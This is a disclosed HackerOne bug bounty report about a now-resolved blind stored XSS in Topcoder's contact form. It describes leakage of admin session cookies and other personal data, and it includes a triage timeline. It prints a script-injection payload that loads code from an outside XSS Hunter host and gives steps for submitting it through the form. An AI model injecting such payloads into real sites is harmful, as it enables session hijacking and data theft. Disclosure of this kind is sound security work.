---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2020-08-07
submitted: 2020-05-19T15:40:22.675Z
bounty_usd: null
votes: 19
cve: []
program: "[[programs/lab45|Lab45]]"
reporter: "mase289"
source: "https://hackerone.com/reports/878145"
title: "Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII"
---
# Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 19 | **Program:** Lab45 | **Disclosed:** 2020-08-07

- Report: [https://hackerone.com/reports/878145](https://hackerone.com/reports/878145)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2020-05-19T15:40:22.675Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://www.topcoder.com/contact-us/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets.  I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

1.	Browse to the page at https://www.topcoder.com/contact-us/ and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field. 
2.	Submit the form and have and admin access the information.
3.	This will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event. 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

F834746  XSS hunter screenshot revealing mail chimp information

█████ Dom.html you can search through this for my XSS hunter payload `"><script src=https://xvt.xss.ht></script>`

F834748 Full XSS hunter email report

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

## Timeline

- **Report Filed**
- **2020-05-19** @mase289: This XSS fired on Mon, May 18, 2:48 AM (1 day ago). I wasn't able to report it at the time due to an insufficient signal on my hackerone account.
- **Report Needs More Info**
- **Report New**
- **2020-05-20** @mase289: Please have a look at the attached XSS hunter email report F834748 that has the full details.  You could open this in an email client such as outlook.  You will find the IP there and extra details in the dom section of the report.
- **Report Triaged**
- **2020-06-02** @mase289: Hi, Any update on this one?
- **2020-06-28** @mase289: Hello @dwan , @retina wondering if this is being acted upon by the program engineers. It's close to 2 months without an update.
- **2020-06-29** @dwan: Hello  @mase289,

Thanks for your patience! The Topcoder team is still working on this internally, and you will be updated once there is more information to share.

Regards,
@dwan
- **2020-08-06** @jwheeler: @mase289 I believe this one is fixed. Can you re-test this?
- **2020-08-06** @mase289: Hi @jwheeler, I have submitted my blind XSS payloads through the contact form.  To properly verify this, someone from the security team needs to view the information I submitted through the form and if this action doesn't trigger my payload, we can verify the fix.
- **2020-08-06** @jwheeler: @mase289 can you provide something that you used when you created the contact?
- **2020-08-06** @jwheeler: Found it. Did you receive anything?
- **2020-08-07** @mase289: Hi @jwheeler, I can confirm that my payload is no longer triggered in the backend. This is resolved.
- **2020-08-07** @jwheeler: Thanks @mase289. We've completely redone the backend for this. Thanks for helping us verify. I'll mark this as resolved.
- **Report Resolved**
- **2020-08-07** @mase289: Great job! @jwheeler would it be okay to disclose this one?
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2020-09-06** @mase289: Hi @jwheeler, could you please remove the dom.html attachment from this report? I am receiving too many triggers from individuals reviewing the attachment thereby inadvertently disclosing to me their IP addresses and file paths from their personal machines.
- **2020-09-06** @jwheeler: Done.
- **2020-09-07** @mase289: Thanks, please redact █████: Screen_Shot_2020-08-06_at_4.26.30_PM.png as well.
- **2020-09-08** @jwheeler: done
